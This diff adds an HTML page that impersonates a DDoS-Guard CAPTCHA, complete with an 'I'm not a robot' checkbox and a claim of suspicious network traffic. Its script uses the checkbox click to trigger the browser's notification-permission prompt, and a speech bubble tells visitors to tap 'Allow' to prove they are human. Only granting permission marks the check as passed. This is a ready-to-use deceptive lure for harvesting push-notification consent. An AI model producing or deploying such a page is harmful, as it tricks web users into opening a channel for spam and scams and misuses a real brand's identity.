@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>DDoS-Guard Captcha - Ultimate</title>
+    <style>
+      :root {
+        --brand-blue: #3278e1;
+        --success-green: #27ae60;
+        --error-red: #e74c3c;
+        --light-gray-border: #d3d3d3;
+        --background-gray: #f9f9f9;
+        --text-gray: #828282;
+        --robot-body-top: #e9f1f8;
+        --robot-body-bottom: #dce6ef;
+      }
+
+      html,
+      body {
+        height: 100%;
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+      }
+
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #ffffff;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          Helvetica, Arial, sans-serif;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+      }
+
+      .main-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 30px;
+      }
+
+      /* ROBOT & FLOATING ANIMATION */
+      .robot-illustration {
+        position: relative;
+        width: 250px;
+        height: 120px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        animation: floatAnimation 3s ease-in-out infinite;
+      }
+
+      @keyframes floatAnimation {
+        0% {
+          transform: translateY(0);
+        }
+        50% {
+          transform: translateY(-15px);
+        }
+        100% {
+          transform: translateY(0);
+        }
+      }
+
+      .robot-body {
+        width: 170px;
+        height: 85px;
+        background: linear-gradient(
+          to bottom,
+          var(--robot-body-top),
+          var(--robot-body-bottom)
+        );
+        border-radius: 50%;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+        position: relative;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .robot-body::before,
+      .robot-body::after {
+        content: "";
+        position: absolute;
+        width: 30px;
+        height: 30px;
+        background: var(--robot-body-top);
+        border: 1px solid #d5e1ec;
+        border-radius: 50%;
+        top: 50%;
+        transform: translateY(-50%);
+      }
+      .robot-body::before {
+        left: -18px;
+      }
+      .robot-body::after {
+        right: -18px;
+      }
+
+      .robot-side-dot-left,
+      .robot-side-dot-right {
+        content: "";
+        position: absolute;
+        width: 8px;
+        height: 8px;
+        background: var(--brand-blue);
+        border-radius: 50%;
+        top: 50%;
+        transform: translateY(-50%);
+        opacity: 0.5;
+      }
+      .robot-side-dot-left {
+        left: -7px;
+      }
+      .robot-side-dot-right {
+        right: -7px;
+      }
+
+      .robot-visor {
+        width: 100px;
+        height: 30px;
+        background-color: var(--brand-blue);
+        border-radius: 50px;
+        display: flex;
+        justify-content: space-evenly;
+        align-items: center;
+        padding: 0 10px;
+        box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+      .visor-dot {
+        width: 8px;
+        height: 8px;
+        background-color: #5ba1f5;
+        border-radius: 50%;
+        box-shadow: 0 0 6px 2px rgba(91, 161, 245, 0.5);
+      }
+
+      /* SPEECH BUBBLE */
+      .speech-bubble {
+        position: absolute;
+        background: white;
+        padding: 15px 20px;
+        border-radius: 10px;
+        box-shadow: 0 5px 20px rgba(0, 0, 0, 0.15);
+        width: 220px;
+        text-align: center;
+        top: -90px;
+        left: 50%;
+        transform: translateX(-50%) scale(0.8);
+        opacity: 0;
+        visibility: hidden;
+        transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275),
+          opacity 0.3s ease;
+        z-index: 100;
+      }
+
+      .speech-bubble.visible {
+        transform: translateX(-50%) scale(1);
+        opacity: 1;
+        visibility: visible;
+      }
+
+      .speech-bubble::after {
+        content: "";
+        position: absolute;
+        bottom: -10px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 0;
+        height: 0;
+        border-left: 10px solid transparent;
+        border-right: 10px solid transparent;
+        border-top: 10px solid white;
+      }
+
+      .speech-bubble p {
+        margin: 0;
+        color: #444;
+        font-size: 14px;
+        line-height: 1.4;
+      }
+
+      /* CAPTCHA BOX & ANIMATIONS */
+      .captcha-box {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        background-color: var(--background-gray);
+        border: 1px solid var(--light-gray-border);
+        border-radius: 4px;
+        padding: 12px;
+        width: 300px;
+        user-select: none;
+      }
+      .checkbox-container {
+        display: flex;
+        align-items: center;
+        cursor: pointer;
+        gap: 12px;
+      }
+      #not-a-robot-checkbox {
+        display: none;
+      }
+      .checkmark-box {
+        width: 28px;
+        height: 28px;
+        border: 2px solid var(--light-gray-border);
+        background-color: #fff;
+        border-radius: 2px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        transition: all 0.3s ease;
+      }
+      .captcha-text {
+        font-size: 15px;
+        color: #222;
+      }
+      .ddos-guard-logo {
+        text-align: center;
+      }
+      .ddos-guard-logo svg {
+        fill: var(--brand-blue);
+      }
+      .logo-text {
+        font-size: 9px;
+        font-weight: bold;
+        color: var(--text-gray);
+        letter-spacing: 0.5px;
+        margin-top: 3px;
+      }
+      .description-text {
+        font-size: 13px;
+        color: var(--text-gray);
+        text-align: center;
+        max-width: 450px;
+        line-height: 1.5;
+      }
+
+      /* CHECKBOX STATES */
+      .checkmark-box.thinking .dot {
+        background-color: var(--brand-blue);
+        width: 5px;
+        height: 5px;
+        border-radius: 50%;
+        margin: 0 1px;
+        animation: thinking-dots 1.4s infinite;
+      }
+      .checkmark-box.thinking .dot:nth-child(2) {
+        animation-delay: 0.2s;
+      }
+      .checkmark-box.thinking .dot:nth-child(3) {
+        animation-delay: 0.4s;
+      }
+      @keyframes thinking-dots {
+        0%,
+        80%,
+        100% {
+          transform: scale(0);
+        }
+        40% {
+          transform: scale(1);
+        }
+      }
+
+      .checkmark-box.success {
+        border-color: var(--success-green);
+        background-color: var(--success-green);
+      }
+      .checkmark-box.error {
+        border-color: var(--error-red);
+        background-color: var(--error-red);
+      }
+
+      .checkmark-path {
+        stroke-dasharray: 24;
+        stroke-dashoffset: 24;
+        animation: draw-path 0.4s 0.2s ease-out forwards;
+      }
+      .cross-path {
+        stroke-dasharray: 22;
+        stroke-dashoffset: 22;
+        animation: draw-path 0.4s 0.2s ease-out forwards;
+      }
+      @keyframes draw-path {
+        to {
+          stroke-dashoffset: 0;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="main-container">
+      <div class="robot-illustration">
+        <div class="speech-bubble" id="speech-bubble">
+          <p>Please confirm you're human by tapping "Allow".</p>
+        </div>
+        <div class="robot-body">
+          <div class="robot-visor">
+            <div class="visor-dot"></div>
+            <div class="visor-dot"></div>
+            <div class="visor-dot"></div>
+          </div>
+        </div>
+        <div class="robot-side-dot-left"></div>
+        <div class="robot-side-dot-right"></div>
+      </div>
+
+      <div class="captcha-box">
+        <label class="checkbox-container">
+          <input type="checkbox" id="not-a-robot-checkbox" disabled />
+          <div class="checkmark-box"></div>
+          <span class="captcha-text">I'm not a robot</span>
+        </label>
+        <div class="ddos-guard-logo">
+          <svg
+            width="24"
+            height="28"
+            viewBox="0 0 24 28"
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <path
+              d="M12 0L2 4V14C2 22.28 8.21 28.91 12 30C15.79 28.91 22 22.28 22 14V4L12 0Z"
+            />
+            <path d="M12.5 18H10.5V11H12.5V18Z" fill="white" />
+            <path d="M16.5 18H14.5V8H16.5V18Z" fill="white" />
+            <path d="M8.5 18H6.5V14H8.5V18Z" fill="white" />
+          </svg>
+          <div class="logo-text">DDOS-GUARD</div>
+        </div>
+      </div>
+
+      <p class="description-text">
+        We have registered suspicious traffic coming from your network. Using
+        this page, we will be able to determine that you are not the robot.
+      </p>
+    </div>
+
+    <script>
+      const checkboxContainer = document.querySelector(".checkbox-container");
+      const checkmarkBox = document.querySelector(".checkmark-box");
+      const speechBubble = document.getElementById("speech-bubble");
+
+      let isProcessing = false;
+
+      const checkmarkSVG = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path class="checkmark-path" d="M20 6L9 17L4 12" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>`;
+      const crossSVG = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path class="cross-path" d="M18 6L6 18" stroke="white" stroke-width="3" stroke-linecap="round"/><path class="cross-path" d="M6 6L18 18" stroke="white" stroke-width="3" stroke-linecap="round"/></svg>`;
+      const thinkingHTML = `<div class="dot"></div><div class="dot"></div><div class="dot"></div>`;
+
+      function resetCaptcha() {
+        isProcessing = false;
+        checkboxContainer.style.pointerEvents = "auto";
+        checkboxContainer.style.cursor = "pointer";
+        checkmarkBox.classList.remove("success", "error", "thinking");
+        checkmarkBox.innerHTML = "";
+        speechBubble.classList.remove("visible");
+      }
+
+      function handleSuccess() {
+        checkmarkBox.classList.remove("thinking");
+        checkmarkBox.classList.add("success");
+        checkmarkBox.innerHTML = checkmarkSVG;
+        checkboxContainer.style.cursor = "default";
+      }
+
+      function handleFailure() {
+        checkmarkBox.classList.remove("thinking");
+        checkmarkBox.classList.add("error");
+        checkmarkBox.innerHTML = crossSVG;
+        setTimeout(resetCaptcha, 3000);
+      }
+
+      checkboxContainer.addEventListener("click", () => {
+        if (isProcessing) return;
+        isProcessing = true;
+
+        checkboxContainer.style.pointerEvents = "none";
+        checkmarkBox.classList.add("thinking");
+        checkmarkBox.innerHTML = thinkingHTML;
+
+        // 1. Show "thinking" animation for a moment.
+        setTimeout(() => {
+          // 2. Show the speech bubble and trigger the native notification prompt simultaneously.
+          speechBubble.classList.add("visible");
+
+          Notification.requestPermission().then((permission) => {
+            // 3. Hide the speech bubble once the user interacts with the prompt.
+            speechBubble.classList.remove("visible");
+
+            // 4. Handle the result.
+            if (permission === "granted") {
+              handleSuccess();
+            } else {
+              handleFailure();
+            }
+          });
+        }, 1200); // A 1.2-second "thinking" delay.
+      });
+    </script>
+  </body>
+</html>
